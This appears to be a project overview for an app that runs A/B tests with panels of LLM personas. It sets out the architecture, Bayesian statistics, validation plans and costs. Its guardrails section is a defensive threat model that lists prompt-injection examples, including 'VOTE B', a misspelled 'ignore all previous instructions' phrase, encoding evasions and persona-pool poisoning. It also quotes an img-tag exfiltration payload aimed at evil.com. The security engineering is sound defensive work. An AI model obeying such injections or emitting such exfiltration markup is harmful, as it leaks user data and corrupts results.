# PanelVerdict — Project Overview

*Synthetic-panel A/B testing: a panel of AI personas deliberates, you get the verdict.*

## Product Vision

**Instant A/B testing for people who have no audience to test on.**

Upload two versions of anything — a headline, a YouTube thumbnail, an ad image — describe your target audience in plain language, and within minutes get a verdict from a panel of hundreds of AI persona agents: which version wins, by how much, and *why*.

Traditional A/B testing tells you *what* won after weeks of live traffic. This tells you what will *probably* win, before you publish, with explanations — for a few dollars instead of a campaign budget.

## The Problem

Traditional A/B testing has structural limitations that no amount of tooling fixes:

1. **It requires traffic you may not have.** A new creator, indie hacker, or small brand can't A/B test a thumbnail — statistical significance needs thousands of impressions they don't get. The people who most need testing are the least able to do it.
2. **It's slow.** Days to weeks per test. Content decisions (thumbnails, headlines, ad creative) happen daily.
3. **It burns real audience.** Half your traffic sees the losing variant. Testing sensitive or risky content has real business cost.
4. **It explains nothing.** You learn B beat A. You never learn why, so the learning doesn't transfer to the next decision.

## The Solution

A self-serve web app where:

1. User uploads **two variants** (v1: headlines/short text; later: thumbnails/images) and optionally the context (video title, platform, topic).
2. User picks the **target audience with controls** — country chips, an age range, gender, education and income — and may optionally *describe* people the pool cannot filter for. *(Revised 2026-08-25 by [094/#200](https://github.com/Subaru-Goto/PanelVerdict/issues/200); this step read "describes the target audience in natural language" while free text was translated into filters.)*
3. An **orchestrator** interprets the target, assembles a panel of 100–300 persona agents, and runs the test in parallel.
4. User receives a **report**: winner, vote split with confidence, breakdown by audience segment (target vs. general control group), and clustered reasons ("B's number in the headline signaled a concrete payoff").

**The core primitive is a *choice*, not a *click*.** Each persona is asked *which of the two variants they'd prefer — A, B, or neither*. "Click" is just the headline/feed instantiation of that preference; for a thumbnail, product design, or ad image the same primitive surfaces as "which would you choose / are you drawn to," and "neither" as "wouldn't pick either." The question wording is a per-domain template variable over a domain-agnostic **{A, B, neither} preference** core. (Caveat carried into validation: Upworthy ground truth is *clicks*, so the click instantiation is the only one validated self-sufficiently today; other choice types are extrapolations until they have their own ground truth.)

### Why AI personas instead of live testing

- **Minutes, not weeks** — no traffic, no recruitment.
- **Pre-launch** — test before anything is public; zero audience exposure.
- **Any audience** — simulate niche or unreachable demographics.
- **Explanations** — agents articulate why they chose, turning a test into creative feedback.
- **Cost** — pennies to a few dollars per test (see Costs).

## Target Users

Primary: **individual creators and indie marketers** — YouTubers, newsletter writers, indie hackers, small e-commerce brands. They make daily creative decisions, have little or no traffic to test with, and can't afford enterprise research tools.

Deliberately *not* targeting enterprises — that's where funded incumbents (Societies.io, Synthetic Users, Evidenza, Aaru) compete with sales teams. The creator/prosumer segment is self-serve, price-sensitive, and unserved.

## System Architecture

```
User input (2 variants + target description)
        │
        ▼
  Orchestrator (LLM)
   - parses target → structured filters + embedding query
        │
        ▼
  Persona Pool (persistent)
   - ~5,000 pre-generated personas, seeded from real
     demographic/survey distributions (not LLM freestyle)
   - SQL filters over typed columns (demographics + Big Five)
   - (vector search over personas and LLM gap-fill: planned,
     then dropped — no persona field is ever model-written;
     see Key design decisions and Structured retrieval below)
        │
        ▼
  Panel sampling (100–300 personas)
   - ~80–90% target-matched, 10–20% random control group
   - fixed seed → reproducible results
        │
        ▼
  Parallel evaluation (config-selected panel model —
   openai/gpt-5.6-luna as of 2026-08)
   - persona rendered into system prompt via template
   - shared prefix (instructions + variants) → prompt caching
   - randomized A/B ordering to kill position bias
   - structured output: vote + 1-line reason
   - runs in batches of ~25 with adaptive stopping (see below)
        │
        ▼
  Bayesian aggregation & report
   - Beta-Binomial posterior → "P(B beats A) = 87%"
   - adaptive stopping: after each chunk, update posterior;
     stop when the report's own 0.95 bar is crossed on two
     consecutive boundaries (see reading-the-posterior.md)
     or at the panel cap — clear winners resolve early
   - segment breakdown (target vs. control group)
   - reason clustering (embed + cluster the rationales)
```

### Key design decisions

- **Persistent persona pool, not on-the-fly generation.** On-the-fly panels collapse to stereotypes, aren't reproducible, and waste tokens. *(Gap-fill superseded as shipped: no persona field is LLM-generated — sampling from real distributions covers the space, and "never model-written" is now a load-bearing security property, see [`least-privilege.md`](least-privilege.md).)*
- **Hybrid targeting.** SQL for exact constraints, embeddings for vibes. Vector-only matching fails on numeric attributes. *(Superseded: [017](decisions/017-representative-sampling.md) made panel targeting SQL-only — every attribute a v1 target can name is a column, and top-n by cosine returns the extreme tail where a panel needs a representative sample. Embeddings survive in `search_personas` and the research corpus; see Structured retrieval below.)*
- **Control group in every panel.** "Your target preferred B; general audiences preferred A" is a richer output than a single winner.
- **Panel size is an experiment, not a slogan.** Agents share one base model and correlate heavily; accuracy likely plateaus by ~200. Measure it.
- **Bayesian over frequentist.** Beta-Binomial posterior gives users "87% probability B wins" instead of p-values — better UX, honest with small panels, and enables adaptive stopping that cuts per-test cost. Caveat reported alongside: the posterior describes the *panel's* preference; only the validation study says how well that transfers to real humans. Both numbers shown separately.
- **LLM calls only where judgment/generation is needed.** Persona votes, target parsing, reason clustering labels = LLM (with structured output / forced function calls). Sampling, batching, posterior updates, stopping rules, aggregation = deterministic Python. Statistics are never delegated to the LLM.

## Validation Strategy (the differentiator)

The core question every competitor hand-waves: *do agent panels predict real humans?* This project answers it honestly, at student budget — and deliberately **only with validation that can be run entirely solo**: no recruited humans, no classmates, no creator partnerships on the critical path. Validation must be reproducible by one person with an API key, so anyone can re-run it. Tests that need other people are optional extras, run post-deployment only if the interest and opportunity appear.

**Tier 1 — self-sufficient validation (the real evidence).**

1. **Upworthy Research Archive — external validity.** ~32,000 real headline A/B tests with impressions and clicks, public. The primary benchmark: run the panel on a sample (e.g. 300–500 tests) and report accuracy vs. chance and vs. published LLM baselines. Every downstream analysis (panel-size plateau, diversity, targeting effect, calibration curve, neither-rate ablation) rides on this one public dataset — no other people required. This is the only test here that shows the panel predicts *real humans* on cases where the answer isn't known in advance.
2. **Internal / construct validity — no ground-truth dataset needed.** Cheap, fully solo, and mostly skipped by competitors:
   - *Order-invariance:* same pair, A/B order swapped → same verdict (position-bias regression).
   - *Test–retest stability:* same test re-run with different seeds → how stable is P(B>A)?
   - *Targeting manipulation check (the cheap first gate):* assign a segment a **known** preference, feed it a pair whose winner that preference predicts, and confirm the verdict moves in the predicted direction. Crucially, run it **target vs. control vs. opposite-segment** — the evidence is that the target segment's preference *diverges from the control group* in the predicted direction, not merely that it picked the "expected" variant (which could just mean that variant is objectively better). This reuses the "control group in every panel" design and directly tests that persona targeting actually steers votes. Run it *before* the Upworthy benchmark: if it fails, something is fundamentally broken and there is no point spending budget on the full study. Passing it is necessary, not sufficient — it proves the machine is coherent, not that it predicts reality.
3. **Published-study replication — external validity beyond Upworthy (incl. designs/images).** Find a peer-reviewed study that manipulated a creative element (headline, CTA, ad, thumbnail/design) and measured CTR/preference on a *described* population; reconstruct that population as a panel, run the workflow, and check whether we reproduce the study's *result* — especially any population-specific effect (seed the study's group → does our panel show the same group-specific effect?). This is the one self-sufficient track that reaches the *visual* domain Upworthy can't, and the most direct test of the targeting claim. Cautions: (1) **memorization/circularity** — the LLM may *recall* a famous result rather than *simulate* it; prefer lesser-known studies and probe whether the model can simply recite the finding; (2) **publication bias + small/WEIRD samples** — reconstruct the actual sample, not an idealized one; (3) **reconstruction fidelity** — papers rarely give full demographics, so it's approximate; (4) expect to reproduce the *direction* more reliably than the magnitude; (5) it's a hand-curated benchmark of ~10–30 studies coded as (population, variant A, variant B, result), not a large dataset.

Research questions worth reporting even with negative results: does persona diversity beat panel size? Does targeting improve accuracy over random panels? Where does accuracy plateau?

**Tier 2 — only if other people get involved (never on the critical path).** Deferred to after deployment, if the interest and opportunity appear:
- **Human-panel parity** — the same pairs to real people via Prolific (~$100–300) or classmates; measure agent–human agreement.
- **Creator partnerships** — mid-size YouTubers (Discords/subreddits) sharing YouTube Test & Compare results in exchange for free access.

**Honest gap — images are the weak spot for self-sufficiency.** Text has Upworthy; thumbnails have no equally-clean public CTR dataset. The **published-study replication** track (Tier 1 #3) is the main *self-sufficient* path into the visual domain — but it's a small hand-curated benchmark, not a 32k-test archive — so image validation still leans partly on Tier 2 (human panels). Another reason images come second, and why the self-sufficient story is strongest for text.

### Sample-size methodology (two different answers)

- **Panel size (agents per test): no classical power analysis.** Adaptive stopping replaces fixed-n design (the posterior decides when to stop; only a budget cap is set), and power formulas assume independent samples — agents sharing one base model are correlated, so any computed n would be fiction. Substitute: the **empirical plateau experiment** — run panels of 25/50/100/200/400 on Upworthy pairs, plot accuracy vs. panel size, let the curve set the budget cap. That plot is the power analysis, done properly for correlated samples.
- **Validation study (number of Upworthy pairs): yes, classical power calc.** Test pairs are independent trials, so binomial power math applies: detecting 60% accuracy vs. the 50% null (80% power, α=0.05) needs ~150–200 pairs; distinguishing 55% from 50% needs ~600+. Implication: the 100-pair sprint smoke test only detects large effects — don't over-interpret it; size the capstone run at 300–500 pairs and include the power justification in the methods section.
- **Minimum detectable effect (MDE) — declare it before running.** The power calc is meaningless without it. Choose the smallest accuracy lift that makes the tool worth using, not the result you hope for. Anchors: 50% = coin flip; published LLM-on-Upworthy baselines; unaided humans are also mediocre at predicting headline winners (beating human guessing is the practical bar for a screening tool). Default: MDE = 10 pts (≥60% vs. 50%), n ≈ 150–200. If pilots hover near 55%, consciously buy the ~600-pair sample — cost here is API budget and runtime, not recruitment, so a smaller MDE is unusually affordable.
- **Product-side analog — ROPE (region of practical equivalence).** Per-test verdicts need a minimum meaningful difference too: define a band around 50/50 — **±7 pts as of 2026-07-27**, widened from ±3 once measurement showed a ±3 band cannot contain the credible interval until ~1,100 votes, so the tie verdict was unreachable at any affordable panel size ([009](decisions/009-build-bayesian-layer.md)). When the interval falls entirely inside, report **"practical tie — pick either, or test a bolder variant"** instead of a fake winner. Note what this does *not* fix, contrary to an earlier claim here: near-tied variants still run to the budget cap. They get an honest label instead of a misleading "winner", which is an improvement, not a saving.
- **Full posterior report (probability + impact).** The Bayesian layer returns more than a winner: P(B > A); preference share with 95% credible interval; **expected preference shortfall** — the average preference-share points a choice falls short of an even split by, *weighted by the probability that it does* (Bayesian decision theory's "expected loss", renamed 2026-07-27: in a marketing report "loss" and "costs" read as money, and this measures neither money nor reader behaviour. Note the weighting — "0.8 pts if it's actually worse" is the *conditional* magnitude, a different number with no likelihood attached. Sounder stopping signal than probability alone, because a small panel has fat tails and probability is blind to magnitude); and P(the preference share falls outside the ROPE). Phrasing rule: magnitudes are **panel preference margins, never predicted CTR change** — different scales. Capstone extra: **calibration curve** from Upworthy (panel margin → probability the real test agreed), enabling the report's most trustworthy sentence: "panels this decisive were right in X% of validated tests."

## Scope & Phasing

**Current chapter (2026-08-21):** the map is [078 · next chapter (#122)](https://github.com/Subaru-Goto/PanelVerdict/issues/122) — PanelVerdict deployed to production on a public URL, satisfying the revised requirement set: **an agent, LangGraph, RAG, human-in-the-loop, deployed, production-ready**. It redraws and closes the public-demo map ([055](decisions/055-map-public-demo.md)), lifting that map's "demo, not real production" ceiling; the human-in-the-loop requirement lands as the panel preview — accept / adjust / redraw before any vote is bought ([076](https://github.com/Subaru-Goto/PanelVerdict/issues/166), [077](https://github.com/Subaru-Goto/PanelVerdict/issues/167)). The phases below are the earlier record.

**Map 1 "PanelVerdict v1 (first complete build)":** text-only, requirement-complete MVP (closed tickets live in [`docs/decisions/`](decisions/README.md); live work is on GitHub Issues).
- Persona pool (~1–5k personas), hybrid targeting (= the "advanced RAG" requirement, delivered as query translation + structured retrieval over the pool), orchestrator, parallel panel, **the full flat binary Bayesian layer** (Beta-Binomial + full posterior report + adaptive stopping + ROPE), report UI, "Ask the analyst" chatbot + ≥3 tools, and a guardrails MVP.
- **Vote schema is a 3-way *preference* {A, B, neither} from day one** (the persona *chooses/prefers* a variant — "click" is just the headline instantiation; forward-compat, see the zero-inflated note below) but *modeled* as binary in the sprint; the neither-rate is reported descriptively and labelled "unvalidated".
- **Validation is the *next* effort (A), not part of v1.** The ~100-pair Upworthy smoke test moves into that effort; v1 is "the working, requirement-complete app", not a validation result.
- Cut scope ruthlessly: no auth, no payments, one LLM provider, no images. (No auth is safe only while not publicly reachable — localhost, or an unguessable link/shared password if a demo is deployed, plus tight per-key budget caps.) *(No-auth superseded 2026-08-21: production-ready per [078 (#122)](https://github.com/Subaru-Goto/PanelVerdict/issues/122) includes authenticated and rate-limited.)*

**Capstone (if sprint works):**
- Full Upworthy validation study + panel-size/diversity experiments.
- Image/thumbnail support (VLM evaluation, small human-panel parity study).
- Reason clustering, segment breakdowns, polished report.
- **"Neither" option via zero-inflated Beta-Binomial — designed for now, built later.** A third preference choice ("wouldn't choose either" — "wouldn't click either" in the headline case) matches real behavior (most people pick neither / scroll past) and enables verdicts traditional A/B can't give: "B beats A, but both are weak — rework before publishing." **Decision (2026-07-16):** whether this actually *adds value* is an empirical question — an LLM persona's "neither" is only useful if it is *calibrated* to real disengagement, and only validation (A) can prove that. So the plan is:
  - **Sprint (C):** capture the 3-way vote schema (cheap — one enum value) and report the neither-rate descriptively, labelled "unvalidated". No zero-inflation math.
  - **Validation (A):** run the ablation — does the panel's neither-rate correlate with real Upworthy CTR / non-click behavior? This is a *stronger* validation axis than "which variant won", because Upworthy gives absolute click rates.
  - **Capstone (B), gated on A:** if the neither-rate correlates → build the full zero-inflated model (zero-inflation mass for "wouldn't choose either" + Beta-Binomial over those who did choose; PyMC). If it's noise → drop it, having spent only a schema field.
  - *Note — do not confuse two separate problems:* **position bias** (top/first slot gets clicked more) is handled by per-agent A/B **order randomization**, an experimental-design fix; **excess "neither"** is handled by this zero-inflation model. They co-occur but are independent.
- **Hierarchical Bayesian model** (persona segment → audience type → platform). Partial pooling gives segment-level estimates that don't overfit small segments, and platform-level priors that improve as tests accumulate ("numbers in headlines help on YouTube, hurt in newsletters") — every new test starts from a smarter baseline. Build flat Beta-Binomial in the sprint; add the hierarchy once accumulated test data gives pooling something to pool. PyMC or Stan.

**Parked ideas (noted for later — not in scope; focus stays on the A/B test):**
- **RAG grounding knowledge base.** *(Un-parked — now a course requirement; see Course Requirements Mapping.)* Small corpus of audience research (Pew surveys, platform behavior studies, marketing findings) chunked + embedded; at test time retrieve topic/audience-relevant snippets into agent prompts so votes cite real behavioral evidence instead of model vibes. Doubles as an ablation study: run Upworthy validation with vs. without grounding → "does RAG improve prediction accuracy?"
- **Customer-data-grounded personas.** Company loads purchase/CRM data → cluster into segments → grounded personas per segment. Strong validity + moat, built-in held-out validation on the customer's own data. Reality check: companies resist uploading customer data (security review, GDPR, procurement — incumbents advertise SOC 2/DPAs for a reason). Softer paths if revisited: read-only integrations (Shopify/GA4) > aggregate stats only > public-data grounding (reviews, social). Privacy by design: segment-level personas, never clones of identifiable individuals; DLP/PII redaction before any LLM call.
- **CLV-weighted verdicts.** From purchase data, compute customer lifetime value per segment (BG/NBD + Gamma-Gamma; `lifetimes` / PyMC-marketing). Report gains a second verdict: raw ("B wins 62% of clicks") vs. CLV-weighted ("A wins among high-value segments — B attracts clicks from segments that rarely buy"). Flags the clickbait trap click-based A/B can't see. Strict sequencing: only after the base panel is validated.

**Future / out of scope for now:** multi-variant (n>2) tests, video, full campaign simulation, social-network effects between personas (what Societies.io does), enterprise features. Also out of scope: synthetic control analysis (Abadie-style counterfactuals from a creator's historical time-series, e.g. "what if you hadn't changed the thumbnail on day X") — a real future feature, but it requires channel data and is a different method from the panel experiment.

## Course Requirements Mapping (chatbot requirement, app-first execution)

The course requires a domain-specialised *chatbot* with advanced RAG + tool calling. The requirement demands the conversational capability — not that chat be the whole UX. Execution: **an app with an analyst embedded in it**, not a chatbot with an app hidden behind it.

*(Superseded 2026-08-21: the requirement set is now — an agent, LangGraph, RAG, human-in-the-loop, deployed, production-ready ([078 · #122](https://github.com/Subaru-Goto/PanelVerdict/issues/122)). The mapping below is kept as the record of what the original chatbot requirement shaped; the analyst, the RAG corpus and the tools all carry forward into the new set.)*

1. **Advanced RAG:**
   - *Knowledge base:* audience-research corpus (Pew surveys, platform behavior studies, marketing findings) — chunked, embedded, similarity-searched; retrieved snippets ground the analyst's explanations. **Not the votes** — injecting research into the vote prompt changes what the panel is and invalidates every number 014/015 measured against the current prompt, so vote grounding is its own before/after experiment ([018](https://github.com/Subaru-Goto/PanelVerdict/issues/124)).
   - *Query translation (retired 2026-08-25):* this leg is gone — filters come from controls, and the free text feeds a **role-play generator** instead: a small model rewrites it into a second-person instruction each panelist acts. A generator retrieves nothing, so the RAG requirement now rests on structured retrieval plus [018/#124](https://github.com/Subaru-Goto/PanelVerdict/issues/124). What the leg used to be: natural language → a typed request → structured SQL filters (self-query over the persona pool). Call it that in the writeup. Built in [007](decisions/007-build-targeting-query-translation.md).
   - *Structured retrieval:* SQL over the persona pool — demographics as equality and range filters, Big Five as score bounds. **Not hybrid, deliberately:** [017](decisions/017-representative-sampling.md) dropped the persona vector, because every attribute a v1 target can name is already a column, and top-*n* by cosine returns the extreme tail where a panel needs a representative sample. Embeddings stay where nothing else can do the job — the free-text corpus above, and `search_personas`.
2. **Tool calling (≥3):** the chat LLM gets tools; each tool is deterministic code inside (LLM decides *when*, code decides *how*). Shipped set (updated 2026-08-21 — all read-only; `run_panel_test` was built, then deliberately removed as the analyst's one spend path, and `estimate_cost`/`get_test_history` were never built — see [`least-privilege.md`](least-privilege.md)):
   - `analyze_results()` — Bayesian posterior: preference share + CrI, expected preference shortfall, the band's probabilities
   - `search_personas(query)` — inspect who's in the sampled audience
   - `read_reasons()` — the panel's vote rationales
   Rerunning is a human decision: the report's **Test again** control goes through `/evaluate`.
3. **Domain specialisation:** domain = content/marketing creative testing; focused knowledge base (above); domain prompts (persona templates, verdict phrasing rules); security = the full guardrails section (injection defense stack is the standout).
4. **Technical implementation:** LangChain + OpenRouter ✓ (already the plan); error handling = retries on fan-out, schema-validated outputs, discard-don't-coerce; input validation = screening stack + size/format limits.
5. **UI (Next.js) — app-first, chat embedded:**
   - Primary flow is structured: upload panel for variants → natural-language target-audience field → run → report dashboard (vote split, posterior plot, segment breakdown, reason clusters). The NL audience field is the conversational input in disguise (free text → query translation → structured retrieval).
   - **"Ask the analyst" chat panel appears with the report, scoped to the current test** — where dialogue beats forms: "Why did the target segment prefer B?" (RAG + sources shown), "Who was on this panel?" (persona tool — *not* rerunning: the analyst deliberately holds no spend path, see [`least-privilege.md`](least-privilege.md)), "How confident should I be?" (Bayesian tool). Suggested-question chips instead of free composition — demos reliably, each chip maps to a graded requirement.
   - Progress indicator = live agent-batch streaming ("87/200 personas voted…") — the panel fan-out makes an unusually good progress display.
   - README sentence for literal-minded graders: "The conversational interface is scoped to results analysis, where dialogue adds value over forms."

## Tech Stack

- **Frontend:** Next.js + Tailwind. Structured upload/report UI with embedded "Ask the analyst" panel; live progress (agents voting in batches streams nicely over SSE/WebSocket).
- **Backend:** Python (FastAPI). The orchestrator runs the pipeline in plain Python — parse target → retrieve personas → fan out panel batches → update posterior → adaptive-stopping loop → aggregate & report. LangChain for model/provider abstraction and structured outputs. **LangGraph deferral superseded 2026-08-21:** the 2026-07-27 decision ([010](decisions/010-assemble-orchestrator-graph.md)) deferred LangGraph because the flow was linear and checkpointing was served by the per-vote cache; [067](decisions/067-where-is-a-hand-authored-graph-worth-it.md) re-decided it — `/evaluate` becomes a hand-authored `StateGraph` around the vote loop, pausing at an `interrupt()` panel-confirmation gate before any vote is bought ([076 · #166](https://github.com/Subaru-Goto/PanelVerdict/issues/166)). The analyst stays on `create_agent` — the opposite of 010's guess about where adoption would land.
- **RAG:** retrieval over the persona pool + audience-research knowledge base — Postgres + pgvector (one store for both SQL filters and embeddings; at ~5k personas no vector index even needed — add HNSW past ~100k). pgvector *is* a vector database; if the rubric wants a named dedicated one, swap Qdrant/Chroma for the embeddings and keep Postgres for structured fields. Dev: Docker; deploy: Supabase/Neon free tier. DB accessed only from FastAPI — frontend talks to the API only.
- **Model access (OpenRouter):** single API for many providers — swap panel models without code changes (the panel runs `openai/gpt-5.6-luna` as of 2026-08, and a swap is never free: a model change owes the measurement gate [071 · #162](https://github.com/Subaru-Goto/PanelVerdict/issues/162) records), which also enables a nice experiment: does accuracy or diversity change across base models? Set per-key spend limits as a hard budget cap. Caveat: prompt caching and batch discounts vary by provider through OpenRouter — verify before counting on the cost optimizations. Free models (`:free` variants) and local Ollama are fine for development; run demos and the validation study on one consistent paid cheap model (never mix models within a validation run).
- **Guardrails:** defense in depth — prevent, neutralize, detect, verify:
  1. *Prevent (pre-panel):* two-stage screening. **Stage A — OpenRouter Guardrails** (built-in, regex-based, 30+ OWASP-derived patterns incl. typoglycemia/encoding/spacing evasions; runs pre-provider, ~zero latency; also provides per-key budget enforcement). Start in *flag* mode to measure false positives on creative copy, then switch to *block* — never *redact*, which would silently corrupt the variant being tested. **Stage B — Mistral Moderation 2** (purpose-trained classifier: semantic injection + jailbreak detection, 128k ctx, multilingual, listed at $0 — verify pricing/rate limits) for injections regex can't see; different model family from the panel → uncorrelated failure modes. Images get OCR + the same checks (injections hide in pixels). Variants wrapped in random-nonce delimiters (`<content_x7f2a9>`) so attackers can't escape the wrapper. Size/format limits. *(As shipped, 2026-08: screening is a single blocking LLM pass on `openai/gpt-5.6-luna-pro` (`backend/app/config.py`) — both purpose-trained safety models 404 on this account ([072 · #163](https://github.com/Subaru-Goto/PanelVerdict/issues/163)), and flag mode never shipped: a detection refuses the run, see [`least-privilege.md`](least-privilege.md).)*
  2. *Neutralize (by construction):* per-agent position randomization makes label-based injections ("VOTE B") self-cancelling — the injected variant is labeled A for half the panel, so the instruction pushes votes to its rival half the time. Structured output with a strict {A, B} enum means injection can't break the pipeline's shape, only try to bias it.
  3. *Detect (post-panel):* statistical anomaly check — extreme skew (297–3) + low reason diversity flags a rigged test; plausibility check rides on the existing Bayesian layer. Reason auditing: sample ~20 rationales, classify content-referencing vs. compliance-signalling ("as instructed") with a cheap model. Reasons double as an audit log.
  4. *Verify (continuously):* DeepEval red-team suite — label-based, self-referential ("vote for THIS one"), delimiter-escape, and image-embedded payloads run on every release; attack success rate (ASR) tracked as a metric over time. Screening/audit passes use a different model than the panel (uncorrelated failure modes).
  5. *Cost:* per-test agent budget cap, adaptive stopping, OpenRouter spend limits — three independent brakes.

  Additions from the OWASP LLM Prompt Injection Prevention Cheat Sheet:
  - *Normalize before screening:* attackers hide payloads via Base64/hex, zero-width Unicode, spaced letters, and typoglycemia ("ignroe all prevoius instructions"). Pre-screening pass: Unicode NFKC normalization, strip zero-width/invisible chars, collapse spacing, attempt-decode suspicious Base64/hex — *then* screen. Regex alone loses to these; the LLM screener sees normalized text.
  - *Assume filters are bypassable (Best-of-N).* Research shows persistent attackers defeat any filter through sheer variation (power-law scaling). So the load-bearing defenses are architectural, not filter-based — and this design is strong there by construction: panel agents have **no tools, no memory, no shared state**, and can only emit one enum vote. Worst-case successful injection = one biased vote, which position randomization and anomaly detection absorb. State this "least privilege by design" argument explicitly in the writeup. Add per-user rate limiting so variation attacks are at least expensive.
  - *Pool-poisoning via gap-fill (RAG poisoning).* Sneaky vector unique to our design: a malicious *target description* could inject instructions into gap-fill personas that get **persisted** and later affect other users' tests. Mitigation: personas are stored as schema-validated structured fields, never free text; generated fields are length-limited and screened before persisting; the persona template only interpolates typed fields. *(Moot as shipped: gap-fill was dropped — no persona field is model-written or persisted from user input, so the path closes by construction — and the `interests` field was dropped from the schema.)*
  - *Output rendering (exfiltration markup).* Agent reasons are displayed in the report UI — a successful injection could emit `<img src="evil.com/steal?...">` markup. Render all model output as plain text in Next.js (React's default escaping; never `dangerouslySetInnerHTML` on model output).
  - *Purpose-trained screener.* Prefer a dedicated classifier (Prompt Guard / Llama Guard / Mistral Moderation class) over a same-family chat model for the screening pass — a jailbreak that beats the panel model is more likely to also beat a guardrail sharing its training. Log every screening decision (LangSmith traces double as security logs); alert on drift in rejection rates.
  - *Red-team seed list:* OWASP's published attack set (direct, encoded, typoglycemia, spacing, remote-injection patterns) goes straight into the DeepEval suite; consider running Garak against the endpoint as a capstone extra.
- **Bayesian layer:** SciPy for flat Beta-Binomial (sprint — it's conjugate, no sampler needed); PyMC for the hierarchical / zero-inflated models (capstone).
- **Observability (LangSmith):** tracing on every run (LangChain callbacks, auto via env vars) — debug the fan-out, track token cost/latency per node and per test. Upworthy sample uploaded as a LangSmith *dataset*; each pipeline change runs as an *experiment* against it, comparing accuracy across versions. Prompt playground for iterating the persona template against real traces. Note: free tier ~5k traces/month and one panel test = hundreds of traces — sample traces during big validation runs (verify current limits).
- **Evaluation:** three distinct layers, kept separate:
  1. *Pipeline QA (DeepEval):* structured-output validity, reason relevance/faithfulness, position-bias regression tests (same pair, swapped order → same verdict), persona-consistency checks. Runs in CI on every change.
  2. *Validation runs (LangSmith datasets/experiments):* accuracy vs. Upworthy ground truth per pipeline version, side-by-side comparisons.
  3. *Statistical analysis (custom code):* credible intervals, panel-size/diversity experiments, human-parity studies — the capstone's own contribution; no off-the-shelf tool does this.

## Costs (order of magnitude, verify current pricing)

- Text test *(figures updated 2026-08 from `USD_PER_VOTE` in `backend/app/config.py` — estimated $0.0003/vote on the current panel model, signed off 2026-08-05)*: ~$0.06 for a 200-vote prod run, ~$0.008 for a 25-vote dev run. Adaptive stopping cuts the prod figure further on clear winners.
- Image test, 1,000 agents: ~$0.50–3.50; under $1 with prompt caching (shared image prefix) and batch API (−50%).
- Persona generation: ~$1–2 per 1,000 personas (batched, one-time).
- Realistic validation run: 200 pairs × 100 agents ≈ **$2.50–5** (iterate on a 30-pair subset at ~$0.50/run; run the full set only twice).
- **Total project API budget: realistically $5–10; under $100 even with heavy iteration.**
- **Public portfolio demo without cost bleed:** (1) demo mode — 5–10 precomputed test results, full report UI, zero API calls (what most recruiters see); (2) live mode hard-capped — 25-agent panels ≈ $0.008/visitor test at the estimated $0.0003/vote, behind a $1/day OpenRouter guardrail budget; (3) free hosting: Vercel + Render/Fly free tier + Supabase. For hiring, the repo (README, architecture diagram, validation plots, cost-engineering story) and a 2-minute demo video matter more than a 24/7 live service.

## Risks & Honest Limitations

- **Validity ceiling.** LLM panels have sycophancy, positivity bias, and homogeneity; published Upworthy-prediction baselines beat chance but are far from oracle. Position the product as a *screening layer before* real testing, not a replacement — same positioning the funded incumbents use.
- **Vision is harder than text.** Thumbnail CTR depends on 120px legibility, feed context, title pairing — VLMs may judge aesthetics, not clicks. That's why images come second.
- **Correlated agents.** 1,000 agents ≠ 1,000 independent humans; report effective panel behavior, don't oversell sample size.
- **Crowded category.** Societies.io (2.5M personas, F100 clients, Point72/YC-backed), Synthetic Users (TikTok, JP Morgan, Samsung), Evidenza, Aaru, Yabble, Fairgen. All enterprise, sales-led, broad research platforms. Differentiation: self-serve, creator-priced, single sharp use case, published honest validation. Their public eval reports (Societies.io accuracy report, Synthetic Users' 85–92% parity studies) are free homework on how (and how not) to measure accuracy.

## Success Criteria

- **Sprint:** end-to-end demo — two headlines in, verdict + reasons out in <2 min; ≥ chance-beating accuracy on a 100-pair Upworthy smoke test.
- **Capstone:** validation study with defensible methodology (power-justified sample, declared MDE); documented findings on panel size, diversity, and targeting effects; working image support with human-parity measurement.
- **Portfolio:** a project that demonstrates agent orchestration, retrieval, structured outputs, evaluation methodology, security engineering, and cost engineering — the full AI-engineering skill set.

## Glossary — persona & personality terms

*v1 personas are built from two field groups: **demographics + Big Five** — an `interests` group was planned and dropped before shipping (full rationale + evidence in [`docs/research/persona-attributes-grounding.md`](research/persona-attributes-grounding.md)). Plain-language definitions of the terms used there and here:*

- **Big Five (a.k.a. OCEAN / Five-Factor Model):** the most scientifically validated model of human personality. Five broad traits, each measured on a spectrum:
  - **O**penness — curious, imaginative, novelty-seeking ↔ conventional, practical
  - **C**onscientiousness — organized, disciplined, reliable ↔ spontaneous, careless
  - **E**xtraversion — outgoing, energetic ↔ reserved, solitary
  - **A**greeableness — warm, cooperative, trusting ↔ critical, competitive
  - **N**euroticism — anxious, emotionally reactive ↔ calm, resilient
  
  Each persona gets five scores, sampled from real population data (age-conditioned) so the pool's personality mix is realistic.
- **BFI-2 (Big Five Inventory-2):** a widely-used, validated questionnaire (Soto & John 2017) for measuring the Big Five. The research found that *how* you express a trait to an LLM matters: **BFI-2-Expanded** (describe the trait level in full sentences) makes the model enact the personality best; **BFI-2-Likert** (numeric agreement scores) works worst. So we render Big Five as expanded sentences, never as numbers.
- **Need for Cognition (NFC):** how much a person enjoys effortful thinking — high-NFC people prefer detailed, information-dense content. *(Not in v1; earns its place via the manipulation check.)*
- **Maximizing vs. Satisficing:** a decision style — *maximizers* compare everything to find the best; *satisficers* pick the first "good enough." *(Not in v1.)*
- **CSII (Consumer Susceptibility to Interpersonal Influence):** a validated scale for how easily someone is swayed by others / social proof. *(Not in v1.)*
- **Sensation-seeking:** craving novel, intense stimulation; drives preference for *visually* complex designs — relevant to the image/thumbnail era, not v1 headlines.
- **ACS PUMS (American Community Survey — Public Use Microdata Sample):** free US Census *individual-level* records — the original plan for demographic grounding. Superseded: the shipped pool samples from **OECD joint tables** (`backend/app/data/joint/`), which cover all three locales (US, JP, DE) where ACS covers only the US.
